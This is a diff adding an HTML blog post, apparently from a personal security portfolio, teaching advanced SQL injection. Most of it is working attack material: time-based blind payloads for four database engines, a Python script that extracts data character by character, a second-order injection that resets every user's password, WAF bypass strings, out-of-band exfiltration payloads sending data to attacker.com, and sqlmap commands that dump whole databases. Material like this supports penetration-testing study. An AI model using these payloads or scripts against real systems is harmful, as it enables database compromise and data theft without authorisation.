@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Advanced SQL Injection | Saketh Reddy</title>
+<link rel="stylesheet" href="blog-style.css"/>
+</head>
+<body>
+<div id="cur"></div><div id="cur-r"></div>
+<canvas id="bg-canvas"></canvas>
+<div id="grain"></div><div id="vig"></div><div id="scl"></div>
+
+<nav class="bnav">
+  <a href="index.html" class="bnav-logo">&gt;_<span>SAKETH</span>.REDDY</a>
+  <a href="index.html" class="bnav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="bhero">
+  <div class="bcat bcat-a">Web Security</div>
+  <h1 class="btitle">Advanced <span>SQL Injection</span>:<br>Beyond Basic UNION Attacks</h1>
+  <div class="bmeta">
+    <span>Feb 3, 2025</span>
+    <span class="bmeta-tag">SQLi</span>
+    <span class="bmeta-tag">WAF Bypass</span>
+    <span class="bmeta-tag">Blind Injection</span>
+    <span class="bmeta-tag">~15 min read</span>
+  </div>
+  <div class="bhero-line"></div>
+</div>
+
+<div class="bcontent">
+  <p>Most SQLi tutorials stop at UNION-based extraction. But real-world targets often have WAFs, blind scenarios, and second-order sinks that demand more sophisticated techniques. This guide covers the advanced end of the SQLi spectrum — time-based blind injection, second-order attacks, and WAF bypass methods that still work.</p>
+
+  <h2>When UNION Fails</h2>
+  <p>UNION attacks require knowing the number of columns and having the output reflected back in the response. When either condition is missing, you need a different strategy:</p>
+  <ul>
+    <li><strong>Error-based:</strong> Trigger DB errors that leak data in error messages</li>
+    <li><strong>Boolean-based blind:</strong> Ask true/false questions, infer data from response differences</li>
+    <li><strong>Time-based blind:</strong> Use conditional delays to extract data bit by bit</li>
+    <li><strong>Out-of-band:</strong> DNS/HTTP exfiltration when no response channel exists</li>
+  </ul>
+
+  <h2>Time-Based Blind SQLi</h2>
+  <p>The most reliable blind technique. When the response looks identical regardless of your payload, use conditional time delays:</p>
+  <div class="cb">
+    <div class="cb-lbl">MySQL — Time-Based</div>
+    <pre>' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)--
+
+# PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# MSSQL
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--</pre>
+  </div>
+  <div class="co co-info">
+    <div class="co-title">ℹ Automation</div>
+    <p>Use SQLMap with <code>--technique=T --level=5 --risk=3</code> to automate time-based extraction. Manual testing first to confirm the delay, then automate the dump.</p>
+  </div>
+
+  <h2>Automating Blind Extraction</h2>
+  <p>Extracting a full database manually via time-based SQLi would take hours. Use this binary search approach to halve extraction time:</p>
+  <div class="cb">
+    <div class="cb-lbl">Python — Binary Search Extractor</div>
+    <pre>import requests, time
+
+def oracle(payload, threshold=4.5):
+    t = time.time()
+    requests.get(f"http://target.com/item?id=1{payload}")
+    return time.time() - t > threshold
+
+def extract_char(query, pos):
+    lo, hi = 32, 126
+    while lo < hi:
+        mid = (lo + hi) // 2
+        p = f"' AND IF(ASCII(SUBSTR(({query}),{pos},1))>{mid},SLEEP(5),0)--"
+        if oracle(p): lo = mid + 1
+        else: hi = mid
+    return chr(lo)
+
+# Extract current database name
+db = ""
+for i in range(1, 20):
+    ch = extract_char("SELECT database()", i)
+    if ord(ch) == 32: break
+    db += ch
+    print(f"DB so far: {db}")</pre>
+  </div>
+
+  <h2>Second-Order SQL Injection</h2>
+  <p>Second-order SQLi is injected at one point but executed later — often in a completely different function. The data is stored safely but used unsafely later:</p>
+  <div class="cb">
+    <div class="cb-lbl">Attack scenario</div>
+    <pre># Step 1: Register a username containing SQLi payload
+POST /register
+username=admin'--
+
+# Step 2: The app stores it raw in the DB (properly escaped at insert)
+INSERT INTO users (username) VALUES ('admin''--')  # safe
+
+# Step 3: Later, the username is used in another query WITHOUT escaping
+UPDATE users SET password='newpass' WHERE username='admin'--'
+# The -- comments out the rest → updates ALL users' passwords</pre>
+  </div>
+  <div class="co co-warn">
+    <div class="co-title">⚠ Why It's Missed</div>
+    <p>Second-order SQLi bypasses input sanitisation at the entry point because the payload is stored, not immediately executed. Scanners that only test request/response pairs miss it entirely.</p>
+  </div>
+
+  <h2>WAF Bypass Techniques</h2>
+  <p>Modern WAFs block obvious SQLi strings. These bypass techniques work against most commercial WAFs as of 2025:</p>
+
+  <h3>Case and Comment Obfuscation</h3>
+  <div class="cb">
+    <div class="cb-lbl">WAF Bypass — Obfuscation</div>
+    <pre># Case variation
+SeLeCt * FrOm users
+
+# Inline comment injection
+SELECT/**/username/**/FROM/**/users
+SEL/**/ECT username FROM users
+
+# MySQL-specific versioned comments
+SELECT /*!50000username*/ FROM users
+
+# URL double encoding
+%2527 = ' (double encoded)
+%2520 = space</pre>
+  </div>
+
+  <h3>HTTP-Level Bypass</h3>
+  <div class="cb">
+    <div class="cb-lbl">Parameter Pollution</div>
+    <pre># HPP — some WAFs only check the first parameter
+GET /item?id=1&id=' UNION SELECT...
+
+# Chunked transfer encoding — some WAFs can't reassemble
+POST /login HTTP/1.1
+Transfer-Encoding: chunked
+
+# JSON SQLi — WAFs often miss injections in JSON bodies
+{"username": "admin' OR '1'='1"}</pre>
+  </div>
+
+  <h2>Out-of-Band Exfiltration</h2>
+  <p>When there is absolutely no response channel, exfiltrate via DNS or HTTP to your own server:</p>
+  <div class="cb">
+    <div class="cb-lbl">DNS Exfiltration (MSSQL)</div>
+    <pre>'; EXEC master..xp_dirtree
+  '//'+SUBSTRING(@@version,1,20)+'.attacker.com/a'--
+
+-- Oracle
+' UNION SELECT UTL_HTTP.REQUEST(
+  'http://attacker.com/'||(SELECT user FROM dual)
+) FROM dual--
+
+-- MySQL (requires FILE privilege)
+' UNION SELECT LOAD_FILE(CONCAT(
+  '\\\\', (SELECT database()), '.attacker.com\\a'))--</pre>
+  </div>
+
+  <h2>SQLMap Advanced Usage</h2>
+  <div class="cb">
+    <div class="cb-lbl">Production SQLMap Commands</div>
+    <pre># Full fingerprint + dump with WAF bypass
+sqlmap -u "http://target.com/item?id=1" \
+  --level=5 --risk=3 \
+  --tamper=space2comment,charunicodeescape,between \
+  --random-agent \
+  --technique=BEUSTQ \
+  --dump-all \
+  --batch
+
+# POST request from Burp
+sqlmap -r request.txt \
+  --tamper=apostrophemask,equaltolike \
+  --dbms=mysql \
+  --dbs
+
+# Blind with custom delay threshold
+sqlmap -u "http://target.com/search?q=test" \
+  --technique=T \
+  --time-sec=3 \
+  --batch -D webapp -T users --dump</pre>
+  </div>
+
+  <h2>Key Takeaways</h2>
+  <ul>
+    <li>If UNION fails, always try time-based blind — it works on almost every DB engine</li>
+    <li>Second-order SQLi requires tracing data flows, not just testing inputs</li>
+    <li>WAF bypass is a cat-and-mouse game — version comments and comment obfuscation beat most blocklists</li>
+    <li>OOB exfiltration is the last resort but requires special DB privileges</li>
+    <li>Combine SQLMap tamper scripts with manual verification for reliable results</li>
+  </ul>
+
+  <div class="bfooter">
+    <span class="bftag">SQL Injection</span><span class="bftag">Blind SQLi</span><span class="bftag">WAF Bypass</span>
+    <span class="bftag">Second-Order</span><span class="bftag">SQLMap</span><span class="bftag">Web Security</span>
+  </div>
+
+  <div class="bmore">
+    <h3>More Writeups</h3>
+    <div class="bmore-links">
+      <a href="blog-ssrf-htb.html" class="bmore-link">
+        <span class="bml-num">01</span>
+        <span class="bml-title">HackTheBox: Exploiting SSRF for Internal Recon</span>
+        <span class="bml-arr">→</span>
+      </a>
+      <a href="blog-wireshark-lateral.html" class="bmore-link">
+        <span class="bml-num">03</span>
+        <span class="bml-title">Wireshark Deep Dive: Detecting Lateral Movement</span>
+        <span class="bml-arr">→</span>
+      </a>
+    </div>
+  </div>
+</div>
+
+<script src="blog-shared.js"></script>
+</body>
+</html>
